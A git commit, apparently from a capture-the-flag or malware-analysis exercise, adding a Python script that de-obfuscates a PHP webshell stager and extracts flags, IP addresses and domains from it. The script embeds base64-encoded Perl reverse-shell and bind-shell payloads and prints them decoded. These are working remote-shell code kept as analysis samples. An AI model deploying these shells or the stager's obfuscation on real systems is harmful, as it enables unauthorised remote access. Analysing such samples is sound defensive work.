4be783ebfeca3ffcce14bf6f1d4c997c1fa5b12a
andrew <andrew@kali.dontdude.lan>
2023-10-06 11:40:41 -0700

    init

---
+++ php_stagger/php_stagger.py
@@ -0,0 +1,60 @@
+import base64, re
+
+
+def deGRi(wyB6B, w3Q12=''):
+    zZ096 = wyB6B
+    pCLb8 = ''
+    fMp3G = 0
+    while fMp3G < len(zZ096):
+        oxWol = 0
+        while oxWol < len(w3Q12) and fMp3G < len(zZ096):
+            pCLb8 += chr(ord(zZ096[fMp3G]) ^ ord(w3Q12[oxWol]))
+            oxWol += 1
+            fMp3G += 1
+    return pCLb8
+
+lBuAnNeu5282 = ')o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0'
+
+with open('php_stagger/large_string.txt', 'r', encoding='utf-8') as f:
+    gbaylYLd6204 = f.read()
+
+fsPwhnfn8423 = ""
+oZjuNUpA325 = ""
+
+for k in [24,4,26,31,29,2,37,20,31,6,1,20,31]:
+    fsPwhnfn8423 += lBuAnNeu5282[k]
+
+for k in [26,16,14,14,31,33]:
+    oZjuNUpA325 += lBuAnNeu5282[k]
+
+#oZjuNUpA325 = strrev
+#$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c'); = create_function
+#fsPwhnfn8423 = base64_decode
+
+c =  base64.b64decode( deGRi(base64.b64decode(gbaylYLd6204).decode('utf-8'), "tVEwfwrN302")).decode('utf-8')
+
+
+
+with open('php_stagger/c_variable_result.txt','w', encoding='utf-8') as f:
+   f.write(c)
+
+with open('php_stagger/c_variable_result.txt', 'r', encoding='utf-8') as f:
+    content = f.read()
+
+flagRegex = r"flag\{[0-9a-f]{32}\}"
+matches = re.findall(flagRegex, content)
+print(matches)
+
+back_connect_p = "IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ=="
+print(base64.b64decode(back_connect_p).decode('utf-8'))
+
+bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="
+print(base64.b64decode(bind_port_p).decode('utf-8'))
+
+ipRegex = '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
+matches = re.findall(ipRegex, content)
+print(matches)
+
+domainRegex = '(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}'
+matches = re.findall(domainRegex, content)
+print(matches)
